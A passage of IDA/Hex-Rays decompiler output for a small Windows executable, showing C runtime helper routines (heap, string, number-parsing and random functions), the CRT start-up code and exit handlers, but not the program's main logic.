    sub_403CF1(v5, a2, a4);
    sub_403CBE(a1, &v5[a4], 0, dwBytes - a4);
  }
  sub_403B92((LPVOID)a2);
  return v5;
}

//----- (00403B92) --------------------------------------------------------
BOOL __cdecl sub_403B92(LPVOID lpMem)
{
  BOOL result; // eax

  if ( lpMem )
    return HeapFree(hHeap, 0, lpMem);
  return result;
}

//----- (00403BAC) --------------------------------------------------------
char *__cdecl sub_403BAC(char *a1, const char *a2)
{
  char *i; // eax

  for ( i = a1; *i; ++i )
    ;
  sub_403C90(i, a2);
  return a1;
}

//----- (00403BCE) --------------------------------------------------------
CHAR *__cdecl sub_403BCE(LPCSTR lpName)
{
  DWORD EnvironmentVariableA; // eax

  EnvironmentVariableA = GetEnvironmentVariableA(lpName, Buffer, 0x400u);
  if ( EnvironmentVariableA && EnvironmentVariableA <= 0x400 )
    return Buffer;
  else
    return 0;
}

//----- (00403BF7) --------------------------------------------------------
int __cdecl sub_403BF7(char *a1, _BYTE *a2)
{
  char v4; // al

  while ( 1 )
  {
    v4 = *a1;
    if ( *a1 != *a2 )
      return v4 - (char)*a2;
    if ( !v4 )
      break;
    ++a1;
    ++a2;
  }
  return 0;
}

//----- (00403C19) --------------------------------------------------------
_BYTE *__cdecl sub_403C19(int a1, _BYTE *a2)
{
  int v2; // eax
  _BYTE *i; // edx
  _BYTE *v4; // esi
  char v5; // al
  _BYTE *v6; // ecx
  _BYTE *v7; // esi

  v2 = a1;
  if ( !a1 )
    v2 = dword_406588;
  for ( i = (_BYTE *)v2; *i; ++i )
  {
    v4 = a2;
    if ( *a2 )
    {
      v5 = *a2;
      do
      {
        if ( v5 == *i )
          break;
        v5 = *++v4;
      }
      while ( *v4 );
    }
    if ( !*v4 )
      break;
  }
  v6 = i;
  v7 = a2;
  if ( *i )
  {
    while ( *v6 != *v7 )
    {
      if ( !*++v7 )
      {
        v7 = a2;
        ++v6;
      }
      if ( !*v6 )
        goto LABEL_17;
    }
    *v6++ = 0;
  }
LABEL_17:
  dword_406588 = (int)v6;
  return v6 != i ? i : 0;
}
// 406588: using guessed type int dword_406588;

//----- (00403C90) --------------------------------------------------------
char *__cdecl sub_403C90(char *a1, const char *a2)
{
  strcpy(a1, a2);
  return a1;
}

//----- (00403CA5) --------------------------------------------------------
LPVOID __cdecl sub_403CA5(SIZE_T dwBytes)
{
  SIZE_T v1; // eax

  v1 = dwBytes;
  if ( !dwBytes )
    v1 = 1;
  return HeapAlloc(hHeap, 0, v1);
}

//----- (00403CBE) --------------------------------------------------------
char *__usercall sub_403CBE@<eax>(int a1@<ebx>, char *a2, char a3, unsigned int a4)
{
  int v4; // eax

  if ( a4 )
  {
    LOBYTE(a1) = a3;
    BYTE1(a1) = a3;
    v4 = a1 << 16;
    LOWORD(v4) = a1;
    memset32(a2, v4, a4 >> 2);
    memset(&a2[4 * (a4 >> 2)], a3, a4 & 3);
  }
  return a2;
}
// 403CBE: could not find valid save-restore pair for ebx

//----- (00403CF1) --------------------------------------------------------
_BYTE *__cdecl sub_403CF1(_BYTE *a1, int a2, int a3)
{
  int v3; // esi
  _BYTE *v4; // ecx

  v3 = a3;
  if ( a3 )
  {
    v4 = a1;
    do
    {
      *v4 = v4[a2 - (_DWORD)a1];
      ++v4;
      --v3;
    }
    while ( v3 );
  }
  return a1;
}

//----- (00403D13) --------------------------------------------------------
unsigned int __cdecl sub_403D13(char *a1)
{
  return sub_403E42(a1, 0, 0xAu);
}

//----- (00403D24) --------------------------------------------------------
int __cdecl sub_403D24(int a1)
{
  int result; // eax

  result = -1;
  do
    ++result;
  while ( *(_BYTE *)(result + a1) );
  return result;
}

//----- (00403D33) --------------------------------------------------------
int sub_403D33()
{
  dword_405568 = 1103515245 * dword_405568 + 12345;
  return HIWORD(dword_405568) & 0x7FFF;
}
// 405568: using guessed type int dword_405568;

//----- (00403D56) --------------------------------------------------------
void __usercall __noreturn start(int a1@<ebx>)
{
  LPSTR CommandLineA; // esi
  unsigned __int8 v2; // cl
  CHAR v3; // al
  int wShowWindow; // eax
  HMODULE ModuleHandleA; // eax
  int v6; // eax
  int v7; // [esp-8h] [ebp-4Ch]
  struct _STARTUPINFOA StartupInfo; // [esp+0h] [ebp-44h] BYREF

  if ( dword_406624 && !dword_406624() )
    ExitProcess(0xFFFFFFFE);
  if ( sub_403F4A(off_40500C, (unsigned int)&unk_405014, 1) )
    ExitProcess(0xFFFFFFFD);
  sub_403F4A(off_405000, (unsigned int)&unk_405008, 0);
  CommandLineA = GetCommandLineA();
  if ( !CommandLineA )
    CommandLineA = (LPSTR)&unk_4040EC;
  v2 = 32;
  while ( 1 )
  {
    if ( !*CommandLineA )
      goto LABEL_20;
    if ( (unsigned __int8)*CommandLineA > 0x20u )
      break;
    ++CommandLineA;
  }
  v3 = *CommandLineA;
  do
  {
    if ( v3 == 34 )
      v2 ^= 0x20u;
    v3 = *++CommandLineA;
  }
  while ( (unsigned __int8)*CommandLineA > v2 );
LABEL_20:
  while ( *CommandLineA && (unsigned __int8)*CommandLineA <= v2 )
    ++CommandLineA;
  StartupInfo.dwFlags = 0;
  GetStartupInfoA(&StartupInfo);
  if ( (StartupInfo.dwFlags & 1) != 0 )
    wShowWindow = StartupInfo.wShowWindow;
  else
    wShowWindow = 10;
  v7 = wShowWindow;
  ModuleHandleA = GetModuleHandleA(0);
  v6 = sub_40102C(a1, (int)ModuleHandleA, 0, (int)CommandLineA, v7);
  sub_403F15(v6);
}
// 405000: using guessed type int (*off_405000[2])(void);
// 40500C: using guessed type int (*off_40500C[2])(void);
// 406624: using guessed type int (*dword_406624)(void);

//----- (00403E2D) --------------------------------------------------------
BOOL sub_403E2D()
{
  hHeap = GetProcessHeap();
  return hHeap == 0;
}

//----- (00403E42) --------------------------------------------------------
unsigned int __cdecl sub_403E42(char *a1, char **a2, unsigned int a3)
{
  unsigned int v4; // esi
  BOOL v5; // edi
  char v6; // cl
  unsigned int v8; // edx
  char v9; // dl
  char v10; // cl
  unsigned int v11; // ecx
  unsigned int v12; // ecx

  v4 = 0;
  v5 = 0;
  while ( *a1 && (unsigned __int8)*a1 <= 0x20u )
    ++a1;
  v6 = *a1;
  if ( !*a1 )
  {
    if ( a2 )
      *a2 = a1;
    return 0;
  }
  if ( v6 == 43 || v6 == 45 )
  {
    ++a1;
    v5 = v6 == 45;
  }
  v8 = a3;
  if ( !a3 )
  {
    if ( *a1 != 48 )
    {
      v8 = 10;
      goto LABEL_33;
    }
    v9 = a1[1];
    if ( v9 != 120 && v9 != 88 )
    {
      v8 = 8;
      ++a1;
      goto LABEL_33;
    }
    v8 = 16;
    goto LABEL_23;
  }
  if ( a3 == 16 && *a1 == 48 )
  {
    v10 = a1[1];
    if ( v10 == 120 || v10 == 88 )
LABEL_23:
      a1 += 2;
  }
LABEL_33:
  while ( 1 )
  {
    LOBYTE(v11) = *a1;
    if ( !*a1 )
      break;
    v11 = (unsigned __int8)v11;
    if ( (unsigned __int8)v11 >= 0x61u )
      v11 = (unsigned __int8)v11 - 32;
    if ( v11 < 0x41 )
    {
      if ( v11 < 0x30 || v11 > 0x39 )
        break;
      v12 = v11 - 48;
    }
    else
    {
      v12 = v11 - 55;
    }
    if ( v12 >= v8 )
      break;
    v4 = v12 + v8 * v4;
    ++a1;
  }
  if ( a2 )
    *a2 = a1;
  if ( v5 )
    return -v4;
  return v4;
}

//----- (00403F15) --------------------------------------------------------
void __cdecl __noreturn sub_403F15(UINT uExitCode)
{
  sub_403F71();
  sub_403F4A(&dword_405018, (unsigned int)&unk_40501C, 0);
  sub_403F4A(&dword_405020, (unsigned int)&unk_405024, 0);
  ExitProcess(uExitCode);
}
// 405018: using guessed type int (*dword_405018)(void);
// 405020: using guessed type int (*dword_405020)(void);

//----- (00403F4A) --------------------------------------------------------
int __cdecl sub_403F4A(int (**a1)(void), unsigned int a2, int a3)
{
  int result; // eax

  while ( (unsigned int)a1 < a2 )
  {
    if ( *a1 )
    {
      result = (*a1)();
      if ( a3 )
      {
        if ( result )
          return result;
      }
    }
    ++a1;
  }
  return 0;
}

//----- (00403F71) --------------------------------------------------------
int sub_403F71()
{
  int result; // eax

  while ( dword_40658C )
    result = ((int (*)(void))dword_4065A0[--dword_40658C])();
  return result;
}
// 40658C: using guessed type int dword_40658C;
// 4065A0: using guessed type int dword_4065A0[32];

// nfuncs=44 queued=43 decompiled=43 lumina nreq=0 worse=0 better=0
// ALL OK, 43 function(s) have been successfully decompiled
